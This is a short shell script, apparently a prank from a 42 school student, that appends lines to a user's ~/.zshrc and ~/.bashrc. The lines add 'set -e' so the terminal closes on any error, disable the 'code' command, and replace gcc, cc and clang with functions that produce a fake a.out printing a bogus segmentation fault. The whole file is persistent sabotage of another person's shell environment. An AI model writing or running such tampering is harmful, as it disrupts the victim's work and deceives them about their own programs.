# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    uwu.sh                                             :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: mmoussou <mmoussou@student.42angouleme.fr  +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/01/17 00:41:51 by mmoussou          #+#    #+#              #
#    Updated: 2024/01/17 01:06:28 by mmoussou         ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

echo "set -e" >> ~/.zshrc
echo "set -e" >> ~/.bashrc

echo "code () {}" >> ~/.zshrc
echo "code () {}" >> ~/.bashrc

echo "gcc () { echo \"echo 'zsh: segmentation fault (core dumped)  ./a.out'\" > a.out; chmod +x a.out }" >> ~/.zshrc
echo "gcc () { echo \"echo 'zsh: segmentation fault (core dumped)  ./a.out'\" > a.out; chmod +x a.out }" >> ~/.bashrc
echo "cc () { echo \"echo 'zsh: segmentation fault (core dumped)  ./a.out'\" > a.out; chmod +x a.out }" >> ~/.zshrc
echo "cc () { echo \"echo 'zsh: segmentation fault (core dumped)  ./a.out'\" > a.out; chmod +x a.out }" >> ~/.bashrc
echo "clang () { echo \"echo 'zsh: segmentation fault (core dumped)  ./a.out'\" > a.out; chmod +x a.out }" >> ~/.zshrc
echo "clang () { echo \"echo 'zsh: segmentation fault (core dumped)  ./a.out'\" > a.out; chmod +x a.out }" >> ~/.bashrc
